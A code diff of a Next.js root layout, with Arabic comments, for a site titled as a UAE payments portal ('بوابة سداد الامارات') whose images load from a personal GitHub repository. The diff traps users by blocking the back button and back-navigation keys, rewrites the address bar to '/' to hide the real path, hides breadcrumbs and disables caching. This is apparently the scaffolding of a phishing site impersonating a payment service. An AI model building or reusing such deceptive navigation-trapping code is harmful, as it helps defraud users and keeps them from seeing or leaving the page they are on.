@@ -1,25 +1,22 @@
-'use client' // <-- ضروري لاستخدام useEffect
+'use client'
 
-import { useEffect } from 'react';
-import { useRouter } from 'next/navigation';
+import { useEffect, useState } from 'react';
+import { useRouter, usePathname } from 'next/navigation';
 
-// 1. استيراد الخطوط من next/font/google
+// استيراد الخطوط
 import { Geist, Geist_Mono, Tajawal } from "next/font/google";
 import "./globals.css";
 
-// 2. تهيئة خط Geist Sans
 const geistSans = Geist({
   variable: "--font-geist-sans",
   subsets: ["latin"],
 });
 
-// 3. تهيئة خط Geist Mono
 const geistMono = Geist_Mono({
   variable: "--font-geist-mono",
   subsets: ["latin"],
 });
 
-// 4. تهيئة خط Tajawal (للغة العربية)
 const tajawal = Tajawal({
   weight: ["400", "700", "900"],
   subsets: ["arabic"],
@@ -27,67 +24,79 @@ const tajawal = Tajawal({
   display: "swap",
 });
 
-// 5. مكون داخلي لإدارة منع الرجوع
-function PreventBackHandler({ children }) {
+// مكون لإدارة المسار ومنع الرجوع
+function AppHandler({ children }) {
   const router = useRouter();
+  const pathname = usePathname();
+  const [currentPath, setCurrentPath] = useState(pathname);
 
   useEffect(() => {
-    // ====== منع زر الرجوع في المتصفح ======
+    // ====== 1. منع الرجوع في المتصفح ======
     
-    // 1. إضافة حالة جديدة في التاريخ لمنع الرجوع
+    // إضافة حالة جديدة في التاريخ
     window.history.pushState(null, '', window.location.href);
 
-    // 2. التعامل مع حدث popstate (عند الضغط على زر الرجوع)
     const handlePopState = (event) => {
-      // منع الرجوع وإعادة توجيه المستخدم إلى نفس الصفحة
+      // منع الرجوع
       window.history.pushState(null, '', window.location.href);
       
-      // اختياري: عرض رسالة للمستخدم
+      // اختياري: عرض رسالة
       // alert('لا يمكن الرجوع إلى الخلف');
     };
 
-    // 3. منع الرجوع باستخدام لوحة المفاتيح (Backspace)
+    // منع Backspace و Alt+Left
     const handleKeyDown = (e) => {
-      // منع Backspace و Alt+Left
       if (e.key === 'Backspace' || (e.altKey && e.key === 'ArrowLeft')) {
         e.preventDefault();
         window.history.pushState(null, '', window.location.href);
       }
     };
 
-    // 4. إضافة المستمعات
     window.addEventListener('popstate', handlePopState);
     window.addEventListener('keydown', handleKeyDown);
 
-    // ====== إخفاء مسار التنقل (Breadcrumb) ======
+    // ====== 2. إخفاء المسار (Path) ======
+    
+    // تغيير المسار المعروض في شريط العنوان
+    const hidePath = () => {
+      // حفظ المسار الحقيقي في localStorage
+      localStorage.setItem('currentPath', window.location.pathname);
+      
+      // تغيير المسار المعروض إلى '/' (الصفحة الرئيسية)
+      if (window.location.pathname !== '/') {
+        window.history.replaceState(null, '', '/');
+      }
+    };
+
+    // تنفيذ إخفاء المسار فوراً
+    hidePath();
+
+    // ====== 3. إخفاء Breadcrumb ======
     const hideBreadcrumb = () => {
-      // تغيير عنوان الصفحة
       document.title = 'بوابة سداد الامارات';
       
-      // إخفاء أي عناصر Breadcrumb
       const breadcrumbSelectors = [
         '.breadcrumb',
         '.breadcrumbs',
         'nav[aria-label="Breadcrumb"]',
         '[role="navigation"][aria-label*="breadcrumb"]',
-        '.MuiBreadcrumbs-root', // لـ Material-UI
-        '.chakra-breadcrumb', // لـ Chakra UI
+        '.MuiBreadcrumbs-root',
+        '.chakra-breadcrumb',
       ];
       
       breadcrumbSelectors.forEach(selector => {
-        const elements = document.querySelectorAll(selector);
-        elements.forEach(el => {
+        document.querySelectorAll(selector).forEach(el => {
           el.style.display = 'none';
         });
       });
     };
 
-    // تنفيذ الإخفاء فوراً
     hideBreadcrumb();
 
-    // مراقبة التغييرات في DOM لإخفاء أي Breadcrumb جديد
+    // مراقبة التغييرات
     const observer = new MutationObserver(() => {
       hideBreadcrumb();
+      hidePath();
     });
 
     observer.observe(document.body, {
@@ -95,30 +104,31 @@ function PreventBackHandler({ children }) {
       subtree: true
     });
 
-    // ====== إخفاء مسار التنقل في شريط العنوان ======
-    // تغيير مسار المتصفح ليظهر بشكل جميل
-    const updateUrl = () => {
+    // ====== 4. مراقبة تغييرات المسار ======
+    const handlePathChange = () => {
       if (window.location.pathname !== '/') {
-        // إخفاء المسار في شريط العنوان (اختياري)
-        // يمكنك استخدام History API لتغيير المسار
-        // window.history.replaceState(null, '', '/');
+        window.history.replaceState(null, '', '/');
       }
     };
 
-    updateUrl();
+    // استخدام Intersection Observer لمراقبة التغييرات
+    const pathObserver = new MutationObserver(handlePathChange);
+    pathObserver.observe(document.querySelector('html'), {
+      attributes: true,
+      attributeFilter: ['data-path']
+    });
 
-    // ====== التنظيف عند إزالة المكون ======
     return () => {
       window.removeEventListener('popstate', handlePopState);
       window.removeEventListener('keydown', handleKeyDown);
       observer.disconnect();
+      pathObserver.disconnect();
     };
-  }, []);
+  }, [pathname]);
 
   return <>{children}</>;
 }
 
-// 6. المكون الرئيسي (RootLayout)
 export default function RootLayout({ children }) {
   return (
     <html
@@ -127,7 +137,6 @@ export default function RootLayout({ children }) {
       className={`${geistSans.variable} ${geistMono.variable} ${tajawal.variable} antialiased h-full`}
     >
       <head>
-        {/* Meta tags للتحكم في العرض */}
         <meta charSet="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <meta name="theme-color" content="#800000" />
@@ -137,23 +146,22 @@ export default function RootLayout({ children }) {
         <meta httpEquiv="Pragma" content="no-cache" />
         <meta httpEquiv="Expires" content="0" />
         
-        {/* Open Graph Image */}
+        {/* Open Graph */}
         <meta property="og:image" content="https://raw.githubusercontent.com/alimilad9988/sdad-emarat/refs/heads/main/public/link.jpg" />
         <meta property="og:image:width" content="1200" />
         <meta property="og:image:height" content="630" />
         <meta property="og:title" content="بوابة سداد الامارات" />
         <meta property="og:description" content="بوابة سداد الامارات - منصة شاملة لتسهيل المدفوعات والخدمات المالية في الإمارات العربية المتحدة." />
         
-        {/* Twitter Card */}
         <meta name="twitter:card" content="summary_large_image" />
         <meta name="twitter:title" content="بوابة سداد الامارات" />
         <meta name="twitter:description" content="بوابة سداد الامارات - منصة شاملة لتسهيل المدفوعات والخدمات المالية في الإمارات العربية المتحدة." />
         <meta name="twitter:image" content="https://raw.githubusercontent.com/alimilad9988/sdad-emarat/refs/heads/main/public/link.jpg" />
       </head>
       <body className="min-h-full flex flex-col font-tajawal bg-gradient-to-br from-gray-50 to-gray-100">
-        <PreventBackHandler>
+        <AppHandler>
           {children}
-        </PreventBackHandler>
+        </AppHandler>
       </body>
     </html>
   );
